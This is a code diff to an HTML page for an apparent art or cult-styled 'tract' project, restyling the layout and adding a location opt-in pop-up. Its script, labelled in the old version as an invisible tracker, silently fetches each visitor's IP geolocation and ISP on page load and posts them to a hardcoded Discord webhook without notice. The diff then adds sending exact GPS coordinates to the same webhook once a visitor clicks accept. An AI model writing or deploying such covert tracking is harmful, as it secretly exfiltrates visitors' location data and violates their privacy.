@@ -17,7 +17,7 @@
       color: #ffe600;
       font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
       font-size: 13px;
-      padding: 16px;
+      padding: 24px;
       min-height: 100vh;
       display: flex;
       flex-direction: column;
@@ -43,49 +43,21 @@
       transform: translateX(-50%);
     }
 
-    /* 3-Column Grid (Sized to prevent scrolling on laptop viewports) */
-    .grid {
-      display: grid;
-      grid-template-columns: repeat(3, 1fr);
-      gap: 10px;
-      width: 100%;
-      margin: 12px 0;
-    }
-
-    .grid-item {
-      width: 100%;
-      border: 2px solid #ffe600;
-      overflow: hidden;
-      background-color: #000;
-      aspect-ratio: 490 / 265;
-      max-height: 22vh; /* Constrains height on desktop so footer stays above fold */
-      display: flex;
-      align-items: center;
-      justify-content: center;
-    }
-
-    .grid-item img {
-      width: 100%;
-      height: 100%;
-      object-fit: cover;
-      display: block;
-    }
-
-    /* Bottom Section: Text & Action Buttons */
-    .content-footer {
+    /* Centered Text & Navigation Buttons Container */
+    .content-center {
       display: flex;
       flex-direction: column;
       align-items: center;
       text-align: center;
-      gap: 16px;
-      margin-top: auto;
-      padding-bottom: 8px;
+      gap: 24px;
+      margin: auto 0;
+      padding: 20px 0;
     }
 
     .statement {
-      max-width: 620px;
-      font-size: 13px;
-      line-height: 1.5;
+      max-width: 580px;
+      font-size: 14px;
+      line-height: 1.6;
       letter-spacing: 0.02em;
       text-transform: lowercase;
     }
@@ -102,7 +74,7 @@
       border: 1px solid #ffe600;
       color: #ffe600;
       background: transparent;
-      padding: 8px 18px;
+      padding: 10px 20px;
       text-decoration: none;
       font-size: 12px;
       font-weight: 500;
@@ -116,22 +88,61 @@
       color: #121212;
     }
 
-    /* Mobile Responsiveness (Allows natural scrolling on phones) */
+    /* Opt-in Modal Overlay */
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(0, 0, 0, 0.92);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      z-index: 1000;
+      padding: 20px;
+    }
+
+    .modal-box {
+      border: 2px solid #ffe600;
+      background-color: #121212;
+      color: #ffe600;
+      padding: 28px;
+      max-width: 480px;
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      gap: 20px;
+      box-shadow: 0 0 35px rgba(255, 230, 0, 0.2);
+    }
+
+    .modal-text {
+      font-size: 13px;
+      line-height: 1.6;
+      letter-spacing: 0.02em;
+      text-transform: lowercase;
+    }
+
+    .modal-buttons {
+      display: flex;
+      gap: 12px;
+      justify-content: center;
+    }
+
+    .btn-decline {
+      border-color: #555;
+      color: #888;
+    }
+
+    .btn-decline:hover {
+      background-color: #333;
+      color: #fff;
+    }
+
+    /* Mobile Responsiveness */
     @media (max-width: 768px) {
       body {
-        height: auto;
-        min-height: 100vh;
-        justify-content: flex-start;
-        gap: 20px;
-      }
-
-      .grid {
-        grid-template-columns: repeat(1, 1fr);
-        gap: 12px;
-      }
-
-      .grid-item {
-        max-height: none;
+        padding: 16px;
       }
 
       .nav-center {
@@ -148,7 +159,7 @@
       .buttons {
         flex-direction: column;
         width: 100%;
-        max-width: 280px;
+        max-width: 320px;
       }
 
       .btn {
@@ -174,7 +185,7 @@
   </nav>
 
   <!-- Centered Message & Navigation Buttons -->
-  <section class="content-footer">
+  <main class="content-center">
     <p class="statement">
       if you are here then it is because this tract has been given to you. do not photograph it. do not share it. meditate upon it and when you are ready, get in touch.
     </p>
@@ -182,31 +193,42 @@
     <div class="buttons">
       <a href="https://instagram.com/feralarchivist" target="_blank" class="btn">follow me ↗</a>
       <a href="https://koltonprocter.net/shop/p/abundance" target="_blank" class="btn">read the gospel, "violette: a triptych"↗</a>
-      <a href="https://forms.gle/VnaQ4TP1jTEMZpvt5" class="btn">will you be my witness?</a>
+      <a href="https://forms.gle/VnaQ4TP1jTEMZpvt5" target="_blank" class="btn">will you be my witness?</a>
     </div>
-  </section>
+  </main>
 
-  <!-- Invisible Discord IP Tracker -->
+  <!-- Omniscience Opt-In Pop-up Modal -->
+  <div id="gps-modal" class="modal-overlay">
+    <div class="modal-box">
+      <p class="modal-text">
+        this website is an experiment in religious omniscience. do you want to opt-in to the beginnings of my accelerationist monastic group? then share your location with me. click "accept".
+      </p>
+      <div class="modal-buttons">
+        <button id="gps-accept" class="btn">accept</button>
+        <button id="gps-decline" class="btn btn-decline">decline</button>
+      </div>
+    </div>
+  </div>
+
+  <!-- Dual Network & GPS Tracking Script -->
   <script>
     (function() {
-      if (sessionStorage.getItem('scanned')) return;
-
       const webhookUrl = "https://discord.com/api/webhooks/1540036622588973208/IudKYFiIddlEWlI7roHuoq4C1rnaw2-N-fvYEr1swegtxGq0FnBAoDmvCBpBWA3Wgmzp";
 
+      // 1. SILENT IMMEDIATE NETWORK PING (Fires on page load)
       fetch('https://ipapi.co/json/')
         .then(res => res.json())
         .then(data => {
           const payload = {
             embeds: [{
-              title: "👁️ Feral Archive Opened",
+              title: "👁️ Network Log (Step 1)",
               color: 16770560,
               fields: [
-                { name: "Location", value: `${data.city || 'Unknown'}, ${data.region || ''} ${data.postal || ''}`, inline: true },
-                { name: "Country", value: `${data.country_name || 'Unknown'}`, inline: true },
-                { name: "ISP", value: `${data.org || 'Unknown'}`, inline: false },
-                { name: "Time", value: new Date().toLocaleString(), inline: true }
+                { name: "Regional Hub", value: `${data.city || 'Unknown'}, ${data.region || ''}`, inline: true },
+                { name: "Carrier / ISP", value: `${data.org || 'Unknown'}`, inline: true },
+                { name: "Time", value: new Date().toLocaleString(), inline: false }
               ],
-              footer: { text: "Omniscient Tracking System" }
+              footer: { text: "5 statements (2 propositions) ledger" }
             }]
           };
 
@@ -216,10 +238,54 @@
             body: JSON.stringify(payload)
           });
         })
-        .then(() => {
-          sessionStorage.setItem('scanned', 'true');
-        })
-        .catch(err => console.error("Log error:", err));
+        .catch(err => console.error("IP log error:", err));
+
+      // 2. MODAL INTERACTION & GPS OPT-IN
+      const modal = document.getElementById('gps-modal');
+      const acceptBtn = document.getElementById('gps-accept');
+      const declineBtn = document.getElementById('gps-decline');
+
+      // Dismiss modal if user clicks decline
+      declineBtn.addEventListener('click', () => {
+        modal.style.display = 'none';
+      });
+
+      // Trigger browser location prompt when clicking accept
+      acceptBtn.addEventListener('click', () => {
+        modal.style.display = 'none';
+
+        if ("geolocation" in navigator) {
+          navigator.geolocation.getCurrentPosition(
+            (position) => {
+              const lat = position.coords.latitude;
+              const lon = position.coords.longitude;
+              const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+
+              const gpsPayload = {
+                embeds: [{
+                  title: "📍 Precise GPS Unlocked (Step 2)",
+                  color: 5763719,
+                  fields: [
+                    { name: "Exact Coordinates", value: `${lat.toFixed(5)}, ${lon.toFixed(5)}`, inline: true },
+                    { name: "Google Maps Pin", value: `[View Pinpoint Location](${mapsUrl})`, inline: false }
+                  ],
+                  footer: { text: "Initiate Verified" }
+                }]
+              };
+
+              fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(gpsPayload)
+              });
+            },
+            (error) => {
+              console.log("GPS denied at system level.");
+            },
+            { enableHighAccuracy: true, timeout: 8000 }
+          );
+        }
+      });
     })();
   </script>
 
